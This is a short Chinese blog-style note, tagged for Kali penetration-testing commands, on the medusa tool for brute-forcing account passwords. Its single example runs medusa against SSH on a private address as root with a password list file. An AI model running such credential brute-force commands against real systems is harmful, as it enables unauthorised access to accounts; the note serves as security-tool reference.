=======================
medusa
=======================


.. post:: 2023-02-20 22:36:38
  :tags: kali, kali渗透专用指令
  :category: 安全
  :author: YanQue
  :location: CD
  :language: zh-cn


暴力破解帐密

示例
=======================

.. code-block:: sh

	# password存放在pwd.txt
	# 以ssh形式破解192.168.135.123帐密
	medusa -M ssh -h 192.168.135.123 -u root -P pwd.txt

